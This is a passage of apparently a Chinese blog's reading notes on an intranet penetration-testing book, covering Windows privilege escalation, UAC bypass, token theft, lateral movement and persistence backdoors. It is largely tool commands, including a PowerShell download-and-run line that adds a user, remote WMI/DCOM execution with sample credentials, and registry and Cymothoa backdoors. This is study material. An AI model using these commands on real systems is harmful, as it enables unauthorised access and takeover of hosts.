+<p>可以通过对比KB来判断是否存在提权漏洞。</p>
+<h3 id="MS16-032"><a href="#MS16-032" class="headerlink" title="MS16-032"></a>MS16-032</h3><p>可以使用Invoke-MS16-032.ps1工具:<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-MS16-032 -Application cmd.exe -Commandline &quot;/c net user 1 1 /add&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>远程加载：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1);Invoke-MS16-032 -Application cmd.exe -Commandline &quot;/c net user 1 1 /add&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>MS16-032的补丁编号为KB3139914</p>
+<h3 id="利用MSF发现缺失补丁"><a href="#利用MSF发现缺失补丁" class="headerlink" title="利用MSF发现缺失补丁"></a>利用MSF发现缺失补丁</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/enum_patches</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows Exploit Suggester"></a>Windows Exploit Suggester</h3><p>将systeminfo信息输出到txt文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo &gt; info.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p>windows-exploit-suggester下载地址：<a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./windows-exploit-suggester.py --update</span><br><span class="line">pip install xlrd --upgrade</span><br><span class="line">/windows-exploit-suggester.py -d BulletinSearch.xlsx -i info.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580471889196.png" alt="1580471889196"></p>
+<p>MSF中也存在此模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Powershell中的Sherlock"><a href="#Powershell中的Sherlock" class="headerlink" title="Powershell中的Sherlock"></a>Powershell中的Sherlock</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1">https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\sherlock.ps1</span><br><span class="line">find-AllVulns</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580472485753.png" alt="1580472485753"></p>
+<h2 id="4-2-Windows操作系统配置错误急用分析和防范"><a href="#4-2-Windows操作系统配置错误急用分析和防范" class="headerlink" title="4.2 Windows操作系统配置错误急用分析和防范"></a>4.2 Windows操作系统配置错误急用分析和防范</h2><h3 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h3><p>使用Powerup</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\Powerup.ps1Invoke-AllChecks</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="注册表键AlwaysInstallElevated"><a href="#注册表键AlwaysInstallElevated" class="headerlink" title="注册表键AlwaysInstallElevated"></a>注册表键AlwaysInstallElevated</h3><p>注册表键值AlwaysInstallElevated是一个策略设置项，Windows允许低权限用户以System权限运行安装文件。如果启用此策略设置项，那么任何权限的用户都能以System权限用户安装MSI类型文件。不过需要开启了Windows installer特权安装功能才能有效果。</p>
+<p>可以直接设置这两个注册表键值为1来进行开启：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevatedHKEY_CURRENT_MACHINE\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+
+
+
+<p>PowerUp中也包含了这样的利用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\PowerUp.ps1//检查注册表设置，如果输出True则表示注册表键值已经被设置Get-RegistryAlwaysInstalledElevated//生成一个MSI文件Write-UserAddMSI//允许文件则会添加一个管理员账户msiexec.exe /q /i UserAdd.msi</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h3><p>这个漏洞在书中说明了利用方式，但是并没有说明根本原理，这个漏洞是由于使用CreateProcess函数创建进程时对第二个参数中的文件路径没有使用双引号括起来，这个不再说明了，在之前整理ATT&amp;CK的文档的时候已经弄过了很多遍。可以参考这个文档：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sevck/p/8488469.html">https://www.cnblogs.com/sevck/p/8488469.html</a></p>
+<p>书中说到了一个查找漏洞存在的方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /c &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>MSF中存在能够利用的模块（需要有session）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use trusted_service_path</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h3><p>利用的是网络管理员在内网中给多台机器配置环境的配置文件中的敏感信息，如密码等。常用配置文件目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysprep.infsysprep.xmlunattend.xmlunattended.xml</span><br></pre></td></tr></table></figure>
+
+
+
+<p>MSF中的利用模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/enum_unattend</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>查看当前计划任务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里提到了一个工具，AccessChk用于在Windows中运行一些系统或程序的高级查询，管理和故障排除工作。可以通过这个工具来查看指定目录的权限配置情况，如果当前权限有某个高权限的程序执行文件的写权限，那么就可以替换高权限文件进行权限提升。（这里说到的是使用计划任务来进行定时执行）</p>
+<p>使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//不弹框运行accesschk.exe /accepteula//这里原书中的命令空格被吞了，说的是列出某个驱动器下所有权限配置有缺陷的文件夹,但是使用了之后发现应该不会遍历所有的文件夹.\accesschk.exe -uwdqs Users c:\.\accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580477640354.png" alt="1580477640354"></p>
+<h3 id="Empire的Powerup模块"><a href="#Empire的Powerup模块" class="headerlink" title="Empire的Powerup模块"></a>Empire的Powerup模块</h3><h2 id="4-3-组策略首选项提权分析及防范"><a href="#4-3-组策略首选项提权分析及防范" class="headerlink" title="4.3 组策略首选项提权分析及防范"></a>4.3 组策略首选项提权分析及防范</h2><p>这个说的就是查找组策略配置文件中加密过的密码，主要就是Group.xml等文件。</p>
+<p>可以直接使用PowerSploit中的Get-GPPPassword.ps1来获取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\Get-GPPpassword.ps1Get-GppPassword</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后使用gpprefdecrypt.py脚本进行解密:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python gpprefdecrypt.py XXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4-4-绕过UAC提权分析及防范"><a href="#4-4-绕过UAC提权分析及防范" class="headerlink" title="4.4 绕过UAC提权分析及防范"></a>4.4 绕过UAC提权分析及防范</h2><h3 id="MSF中的bypassuac"><a href="#MSF中的bypassuac" class="headerlink" title="MSF中的bypassuac"></a>MSF中的bypassuac</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuacset session Xrun</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="MSF中的RunAs"><a href="#MSF中的RunAs" class="headerlink" title="MSF中的RunAs"></a>MSF中的RunAs</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/askset session Xrun</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行后目标主机会弹出一个UAC的框，需要点击是然后才回弹回一个新的session，如果弹回的不是system权限的session则可以使用getsystem命令提升</p>
+<h3 id="Nishang中的Invoke-PsUACme模块"><a href="#Nishang中的Invoke-PsUACme模块" class="headerlink" title="Nishang中的Invoke-PsUACme模块"></a>Nishang中的Invoke-PsUACme模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//使用sysprep方法并执行默认的payload</span><br><span class="line">Invoke-PsUACme -Verbose</span><br><span class="line"></span><br><span class="line">//使用oobe方法并执行默认的payloadInvoke-PsUACme -methed oobe -Verbose</span><br><span class="line"></span><br><span class="line">//使用oobe方法执行自定义的payloadInvoke-PsUACme -methed oobe -Payload &quot;powershell -windowstyle hidden -e &lt;your encoded payload&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以使用payloadpath参数指定payload的路径。</p>
+<h3 id="Empire中的bypassuac模块"><a href="#Empire中的bypassuac模块" class="headerlink" title="Empire中的bypassuac模块"></a>Empire中的bypassuac模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc/bypassuac</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4-5-令牌窃取分析及防范"><a href="#4-5-令牌窃取分析及防范" class="headerlink" title="4.5 令牌窃取分析及防范"></a>4.5 令牌窃取分析及防范</h2><p>几个名词：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access token访问令牌：代表访问控制操作主体的系统对象security token认证令牌或硬件令牌：是一种用于实现计算机身份校验的物理设备，例如U盾session token会话令牌：是交互会话中唯一的身份标识符</span><br></pre></td></tr></table></figure>
+
+
+
+<p>伪造令牌攻击的核心是Kerberos协议。</p>
+<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><p>MSF中的利用(已经有meterpreter)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use incognitolist_tokens -u</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/1580525380729.png" alt="1580525380729"></p>
+<p>两种类型的令牌：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Delegation Tokens 授权令牌：支持交互式登录（例如可以通过远程桌面登录及访问）Impersonation Tokens 模拟令牌：支持非交互式的会话</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在MSF中可以选择使用某一个特定的TOKEN</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impersonate_token</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Rotten-Potato本地提权分析"><a href="#Rotten-Potato本地提权分析" class="headerlink" title="Rotten Potato本地提权分析"></a>Rotten Potato本地提权分析</h3><p>利用的前提是系统中要存在有效的令牌，然后用这个工具快速模拟用户令牌，书中的环境存在SYSTEM的token，所以可以使用下面的命令进行窃取</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/foxglovesec/RottenPotato.git">https://github.com/foxglovesec/RottenPotato.git</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /opt/RottenPotato/rottenpotato.exeexecute -HC -f rottenpotato.exeimpersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="添加域管理员"><a href="#添加域管理员" class="headerlink" title="添加域管理员"></a>添加域管理员</h3><p>这里说到了使用MSF的migrate命令，借助system权限的进程进行执行命令</p>
+<h3 id="Empire下的令牌窃取分析"><a href="#Empire下的令牌窃取分析" class="headerlink" title="Empire下的令牌窃取分析"></a>Empire下的令牌窃取分析</h3><p>这里说的是使用Empire下的creds命令和mimikatz模块进行pth攻击</p>
+<h2 id="4-6-无凭证条件下的权限获取分析及防范"><a href="#4-6-无凭证条件下的权限获取分析及防范" class="headerlink" title="4.6 无凭证条件下的权限获取分析及防范"></a>4.6 无凭证条件下的权限获取分析及防范</h2><p>主要说了一下使用Responder进行欺骗</p>
+<h1 id="第五章-域内横向移动分析及防御"><a href="#第五章-域内横向移动分析及防御" class="headerlink" title="第五章 域内横向移动分析及防御"></a>第五章 域内横向移动分析及防御</h1><h2 id="5-1-常用Windows远程连接和命令"><a href="#5-1-常用Windows远程连接和命令" class="headerlink" title="5.1 常用Windows远程连接和命令"></a>5.1 常用Windows远程连接和命令</h2><p>IPC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.10\ipc$ &quot;admin123&quot; /user:administrator</span><br></pre></td></tr></table></figure>
+
+
+
+<p>dir</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.1.10\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<p>tasklist</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /S 192.168.1.10 /U administrator /P admin123</span><br></pre></td></tr></table></figure>
+
+
+
+<p>at：是Windows server 2008之前的计划任务命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 4:11PM C:\shell.bat</span><br></pre></td></tr></table></figure>
+
+
+
+<p>创建之后会有一个任务ID，指定任务ID可以删除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.10 7 /delete</span><br></pre></td></tr></table></figure>
+
+
+
+<p>schtasks</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.1.10 /tn test /sc onstart /tr C:\calc.bat /ru system /f</span><br></pre></td></tr></table></figure>
+
+
+
+<p>介绍了几种抓取本地账户密码和SAM中HASH值的方法，直接跳过了，可以参考ATT&amp;CK中的Credential Access一章</p>
+<h2 id="5-6-WMI"><a href="#5-6-WMI" class="headerlink" title="5.6 WMI"></a>5.6 WMI</h2><p>基本的执行方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.1.10 /user:administrator /password:admin123 process call create &quot;cmd.exe&quot; /c ipconfig &gt; ip.txt&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>其他工具：</p>
+<p>impacket中的wmiexec，成功连接之后会有一个交互式的命令行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py administrator:admin123@192.168.1.10</span><br></pre></td></tr></table></figure>
+
+
+
+<p>wmiexec.vbs</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe //nologo wmiexec.vbs /shell <span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span> administrator admin123</span><br><span class="line"></span><br><span class="line">cscript.exe wmiexec.vbs /cmd <span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span> administrator admin123 <span class="string">&quot;ipconfig&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Invoke-WMICommand</p>
+<p>Invoke-WMICommand是PowerSpolit中的脚本：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="string">&quot;test\administrator&quot;</span></span><br><span class="line"><span class="variable">$password</span> = ConverTo<span class="literal">-SecureString</span> <span class="literal">-String</span> <span class="string">&quot;admin123&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Management.Automation.PSCredential <span class="literal">-ArgumentList</span> <span class="variable">$user</span>, <span class="variable">$password</span></span><br><span class="line"><span class="variable">$remote</span> = <span class="built_in">Invoke-WmiCommand</span> <span class="literal">-Payload</span> &#123;ipconfig&#125; <span class="literal">-Credential</span> <span class="variable">$Cred</span> <span class="literal">-ComputerName</span> <span class="number">192.168</span>.<span class="number">1.10</span></span><br><span class="line"><span class="variable">$remote</span>.PayloadOutput</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Invoke-WMIMethod是powershell自带的</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="string">&quot;test\administrator&quot;</span></span><br><span class="line"><span class="variable">$password</span> = ConverTo<span class="literal">-SecureString</span> <span class="literal">-String</span> <span class="string">&quot;admin123&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Management.Automation.PSCredential <span class="literal">-ArgumentList</span> <span class="variable">$user</span>, <span class="variable">$password</span></span><br><span class="line"><span class="built_in">Invoke-WMIMethod</span> <span class="literal">-Class</span> Win32_Process <span class="literal">-Name</span> Create <span class="literal">-ArgumentList</span> <span class="string">&quot;ipconfig&quot;</span> <span class="literal">-ComputerName</span> <span class="string">&quot;192.168.1.10&quot;</span> <span class="literal">-Credential</span> <span class="variable">$Cred</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-8-SMBEXEC"><a href="#5-8-SMBEXEC" class="headerlink" title="5.8 SMBEXEC"></a>5.8 SMBEXEC</h2><p>Impacket中有这个插件</p>
+<p>Linux版本下载地址：<a target="_blank" rel="noopener" href="https://github.com/brav0hax/smbexec.git">https://github.com/brav0hax/smbexec.git</a></p>
+<p>安装命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/brav0hax/smbexec.git</span><br><span class="line">chmod +x install.sh &amp;&amp; ./install.sh</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-9-DCOM在远程系统中的使用"><a href="#5-9-DCOM在远程系统中的使用" class="headerlink" title="5.9 DCOM在远程系统中的使用"></a>5.9 DCOM在远程系统中的使用</h2><h3 id="通过本地DCOM执行命令"><a href="#通过本地DCOM执行命令" class="headerlink" title="通过本地DCOM执行命令"></a>通过本地DCOM执行命令</h3><p>获取DCOM程序列表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="使用DCOM在远程机器上执行命令"><a href="#使用DCOM在远程机器上执行命令" class="headerlink" title="使用DCOM在远程机器上执行命令"></a>使用DCOM在远程机器上执行命令</h3><p>1、调用MMC20.Application远程执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.10 &quot;admin123&quot; /user:test\xiaom</span><br><span class="line">$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.1.10&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#x27;cmd.exe&#x27;,$null,&quot;/c cmd.exe&quot;,&quot;&quot;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、调用9BA05972-F6A8-11CF-A442-00A0C90A8F39</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$com = [Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;,&quot;192.168.1.10&quot;)</span><br><span class="line">$obj = [System.Activator]::CreateInstance($com)</span><br><span class="line">$item = $obj.item()</span><br><span class="line">$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)关于这个方法的详细内容可以参考文章：https://bbs.pediy.com/thread-226540-1.htm</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-10-SPN在域环境中的应用"><a href="#5-10-SPN在域环境中的应用" class="headerlink" title="5.10 SPN在域环境中的应用"></a>5.10 SPN在域环境中的应用</h2><h2 id="5-11-Exchange邮件服务器安全防范"><a href="#5-11-Exchange邮件服务器安全防范" class="headerlink" title="5.11 Exchange邮件服务器安全防范"></a>5.11 Exchange邮件服务器安全防范</h2><p>查看邮件数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//查询之前需要安装命令</span><br><span class="line">add-pssnapin microsoft.exchange *</span><br><span class="line">Get-MailboxDatabase -server &quot;Exchange1&quot;</span><br><span class="line">Get-MailboxDatabase -Identity &#x27;Mailbox Database 1894576043&#x27; | Format-List Name,EdbFilePath,LogFolderPath</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="第六章-域控制器安全"><a href="#第六章-域控制器安全" class="headerlink" title="第六章 域控制器安全"></a>第六章 域控制器安全</h1><h2 id="6-1-NTDS-dit"><a href="#6-1-NTDS-dit" class="headerlink" title="6.1 NTDS.dit"></a>6.1 NTDS.dit</h2><h2 id="6-2-导出ntds-dit中的散列值"><a href="#6-2-导出ntds-dit中的散列值" class="headerlink" title="6.2 导出ntds.dit中的散列值"></a>6.2 导出ntds.dit中的散列值</h2><h2 id="6-3-利用dcsync获取散列值"><a href="#6-3-利用dcsync获取散列值" class="headerlink" title="6.3 利用dcsync获取散列值"></a>6.3 利用dcsync获取散列值</h2><h2 id="6-4-使用MSF获取散列值"><a href="#6-4-使用MSF获取散列值" class="headerlink" title="6.4 使用MSF获取散列值"></a>6.4 使用MSF获取散列值</h2><h2 id="6-6-Kerberos与用户提权漏洞分析与防范"><a href="#6-6-Kerberos与用户提权漏洞分析与防范" class="headerlink" title="6.6 Kerberos与用户提权漏洞分析与防范"></a>6.6 Kerberos与用户提权漏洞分析与防范</h2><h1 id="第七章-跨域攻击分析与防御"><a href="#第七章-跨域攻击分析与防御" class="headerlink" title="第七章 跨域攻击分析与防御"></a>第七章 跨域攻击分析与防御</h1><h2 id="7-2-利用域信任关系的跨域攻击分析"><a href="#7-2-利用域信任关系的跨域攻击分析" class="headerlink" title="7.2 利用域信任关系的跨域攻击分析"></a>7.2 利用域信任关系的跨域攻击分析</h2><h3 id="获取域信息"><a href="#获取域信息" class="headerlink" title="获取域信息"></a>获取域信息</h3><p>这里说到了lg.exe这个工具，能够用来枚举远程主机用户和组的信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//枚举域中的用户组</span><br><span class="line">lg.exe &lt;domain name&gt;</span><br><span class="line"></span><br><span class="line">//枚举远程机器的本地组用户</span><br><span class="line">lg.exe \\dc2012</span><br><span class="line"></span><br><span class="line">//获取远程用户中全部用户的SID</span><br><span class="line">lg.exe \\dc2012 -lu -sidsout</span><br><span class="line"></span><br><span class="line">//获取指定组中所有成员的SID</span><br><span class="line">lg.exe \\dc2012\administrators -sidsout</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="7-3-防范跨域攻击"><a href="#7-3-防范跨域攻击" class="headerlink" title="7.3 防范跨域攻击"></a>7.3 防范跨域攻击</h2><h1 id="第八章-权限维持分析及防御"><a href="#第八章-权限维持分析及防御" class="headerlink" title="第八章 权限维持分析及防御"></a>第八章 权限维持分析及防御</h1><h2 id="8-1-操作系统后门分析与防范"><a href="#8-1-操作系统后门分析与防范" class="headerlink" title="8.1 操作系统后门分析与防范"></a>8.1 操作系统后门分析与防范</h2><h3 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h3><h3 id="注册表注入后门"><a href="#注册表注入后门" class="headerlink" title="注册表注入后门"></a>注册表注入后门</h3><p>这个在ATT&amp;CK中的Persistence一章中的Registry Run Keys / Startup Folder中有提到。命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v RegRun /t REG_SZ /d &quot;c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h3><h3 id="meterpreter后门"><a href="#meterpreter后门" class="headerlink" title="meterpreter后门"></a>meterpreter后门</h3><h3 id="Cymothoa后门"><a href="#Cymothoa后门" class="headerlink" title="Cymothoa后门"></a>Cymothoa后门</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/cymothoa/">https://sourceforge.net/projects/cymothoa/</a></p>
+<p>安装可参照<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_17204441/article/details/88834099">https://blog.csdn.net/qq_17204441/article/details/88834099</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cymothoa -s 0 -p &lt;process id&gt; -y &lt;port&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>安装成功后使用nc等工具连接设置的端口即可。</p>
+<h3 id="WMI后门"><a href="#WMI后门" class="headerlink" title="WMI后门"></a>WMI后门</h3><p>WMI后门的特征是无文件和无进程，将代码加密存储于WMI中，达到所谓的无文件，当设定的条件被满足时，系统将自动启动Powershell进程去执行后门程序，执行后进程将会消失。</p>
+<p>Empire下有WMI相关的模块可以使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell/persistence/elevated/wmi</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以在目标主机中使用命令查看存在的后门：</p>
